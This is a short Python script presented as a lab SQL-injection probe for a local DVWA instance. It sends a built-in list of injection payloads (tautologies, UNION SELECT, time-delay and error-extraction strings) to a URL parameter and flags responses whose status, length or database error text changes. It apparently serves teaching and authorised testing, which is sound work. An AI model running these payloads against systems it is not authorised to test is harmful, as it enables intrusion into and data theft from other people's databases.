#!/usr/bin/env python3
"""
Minimal error-based SQLi probe for a parameterized GET endpoint.

Not a production scanner — demonstrates scripting detection heuristics
(length/status/header deltas, common SQL error substrings) after mapping
in Burp. Use only against systems you own (e.g. local DVWA).

Example (DVWA SQL Injection page, Low security, after logging in):
  export DVWA_COOKIE="PHPSESSID=...; security=low"
  python sqli_scanner.py \\
    --url "http://localhost:4280/vulnerabilities/sqli/?id=FUZZ&Submit=Submit" \\
    --cookie "$DVWA_COOKIE"
"""

from __future__ import annotations

import argparse
import sys
import time
from typing import Iterable
from urllib.parse import quote

import requests

# Common error-based / syntax-breaking probes (subset for lab demo)
DEFAULT_PAYLOADS: list[str] = [
    "'",
    "''",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' OR 1=1--",
    "1' UNION SELECT NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1; SELECT 1",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
]

ERROR_MARKERS = (
    "sql syntax",
    "mysql",
    "mysqli",
    "sqlite",
    "postgresql",
    "pg_query",
    "ora-",
    "microsoft ole db",
    "odbc driver",
    "unclosed quotation",
    "quoted string not properly terminated",
    "warning: mysql",
)


def load_payloads(path: str | None) -> list[str]:
    if not path:
        return list(DEFAULT_PAYLOADS)
    with open(path, encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


def baseline(session: requests.Session, template: str, marker: str) -> tuple[int, str, dict[str, str]]:
    safe_url = template.replace(marker, "1")
    r = session.get(safe_url, timeout=15)
    body = r.text.lower()
    return r.status_code, body, dict(r.headers)


def looks_interesting(
    baseline_status: int,
    baseline_body: str,
    baseline_len: int,
    r: requests.Response,
) -> tuple[bool, str]:
    body = r.text.lower()
    if r.status_code != baseline_status:
        return True, f"status {baseline_status} -> {r.status_code}"
    if abs(len(r.text) - baseline_len) > max(80, int(baseline_len * 0.15)):
        return True, f"length delta {len(r.text) - baseline_len:+d}"
    for m in ERROR_MARKERS:
        if m in body and m not in baseline_body:
            return True, f"error marker: {m!r}"
    return False, ""


def run(url_template: str, marker: str, payloads: Iterable[str], cookie: str | None, delay: float) -> int:
    session = requests.Session()
    session.headers.update({"User-Agent": "sqli-lab-probe/0.1"})
    if cookie:
        session.headers["Cookie"] = cookie

    try:
        b_status, b_body, _ = baseline(session, url_template, marker)
    except requests.RequestException as e:
        print(f"[!] Baseline request failed: {e}", file=sys.stderr)
        return 2

    b_len = len(b_body)
    print(f"[*] Baseline: HTTP {b_status}, body length ~{b_len}")
    hits = 0

    for p in payloads:
        encoded = quote(p, safe="")
        test_url = url_template.replace(marker, encoded)
        try:
            r = session.get(test_url, timeout=15)
        except requests.RequestException as e:
            print(f"[-] Payload transport error ({p!r}): {e}", file=sys.stderr)
            continue

        interesting, reason = looks_interesting(b_status, b_body, b_len, r)
        if interesting:
            hits += 1
            print(f"[!] Possible signal — {reason}")
            print(f"    Payload: {p}")
            print(f"    URL:     {test_url[:200]}{'...' if len(test_url) > 200 else ''}")
        time.sleep(delay)

    print(f"[*] Done. Flagged {hits} response(s) worth manual review in Burp.")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description="Minimal SQLi response-diff probe (lab only).")
    parser.add_argument(
        "--url",
        required=True,
        help="Target URL with a placeholder (default FUZZ), e.g. ...?id=FUZZ&Submit=Submit",
    )
    parser.add_argument("--marker", default="FUZZ", help="Placeholder substring to replace with each payload.")
    parser.add_argument("--cookie", default=None, help="Raw Cookie header (e.g. PHPSESSID + security=low).")
    parser.add_argument("--payload-file", default=None, help="Line-delimited payloads (else built-in small set).")
    parser.add_argument("--delay", type=float, default=0.2, help="Seconds between requests.")
    args = parser.parse_args()

    if args.marker not in args.url:
        print(f"[!] URL must contain marker {args.marker!r}.", file=sys.stderr)
        return 2

    payloads = load_payloads(args.payload_file)
    return run(args.url, args.marker, payloads, args.cookie, args.delay)


if __name__ == "__main__":
    raise SystemExit(main())
